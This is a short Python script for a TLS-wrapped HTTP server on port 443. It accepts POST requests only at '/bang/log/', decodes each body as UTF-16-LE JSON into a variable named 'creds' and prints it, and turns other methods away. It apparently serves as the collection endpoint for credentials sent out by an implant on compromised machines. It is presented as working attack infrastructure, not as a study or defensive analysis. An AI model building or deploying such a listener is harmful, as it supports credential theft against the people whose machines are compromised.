import hashlib
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import os
import socket
import ssl
import urllib

SRV_PORT = 443
BANG_CERT = "./bangsrv.pem"
BANG_ENDPOINT = "/bang/log/"


class BangSrvHandler(BaseHTTPRequestHandler):
    """basic HTTP request handler"""

    def do_GET(self):
        # never accept GET requests
        self.send_response(404)  # 404 Not Found
        self.end_headers()

    def do_POST(self):
        if self.path != BANG_ENDPOINT:
            self.send_response(404)  # 404 Not Found
            self.end_headers()
            return
            
        content_length = int(self.headers["Content-Length"])
        post_data = self.rfile.read(content_length)
        
        try:
            creds = json.loads(post_data.decode("utf-16-le"))
            print(creds)
        except:
            self.send_response(400)  # 400 Bad Request
        else:
            self.send_response(200)  # 200 OK
        self.end_headers()
        
    def do_PUT(self):
        # never accept PUT requests
        self.send_response(403)  # 403 Forbidden
        self.end_headers()


if __name__ == "__main__":
    ssl_ctx = ssl.SSLContext(protocol=ssl.PROTOCOL_TLSv1_2)
    ssl_ctx.load_cert_chain(BANG_CERT)

    httpd = HTTPServer(("0.0.0.0", SRV_PORT), BangSrvHandler)
    httpd.socket = ssl_ctx.wrap_socket(httpd.socket, server_side=True)
    
    httpd.serve_forever()
